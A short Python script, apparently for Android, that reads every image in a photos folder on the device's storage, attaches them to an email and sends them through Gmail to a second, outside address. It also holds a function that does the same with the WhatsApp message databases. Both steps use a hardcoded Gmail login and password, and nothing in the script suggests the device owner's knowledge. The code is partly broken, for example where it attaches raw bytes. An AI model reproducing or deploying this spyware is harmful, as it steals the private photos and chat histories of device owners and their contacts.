import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import os

class EmailData:
    def __init__(self):
        self.root = MIMEMultipart()
        self.mail = "castrofredy249@gmail.com"
        self.dst = "lonan2444@gmail.com"
        self.u = smtplib.SMTP("smtp.gmail.com:587")
        self.u.starttls()


    def send_image(self):
        root = self.root
        u = self.u
        image = os.listdir("/sdcard/1A/Fotos")
        path = "/sdcard/1A/Fotos"

        for k in image:
            foto = open(path+"/{}".format(k),"rb").read()
            x = MIMEImage(foto)
   


            root.attach(x)
            u.login("castrofredy249@gmail.com","Helloworld00")
            u.sendmail("castrofredy249@gmail.com","lonan2444@gmail.com",root.as_string())

    def send_whatsapp_database(self):
           root = self.root
           data = self.u
           path = "/sdcard/WhatsApp/Databases"
           file = os.listdir("/sdcard/WhatsApp/Databases")
           for x in file:
               x = open(path+"/{}".format(x),"rb").read()
               root.attach(x)
               data.login("castrofredy249@gmail.com","Helloworld00")
               data.sendmail(self.mail,self.dst,root.as_string())



def main():
    Dk = EmailData()
    Dk.send_image()

if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()
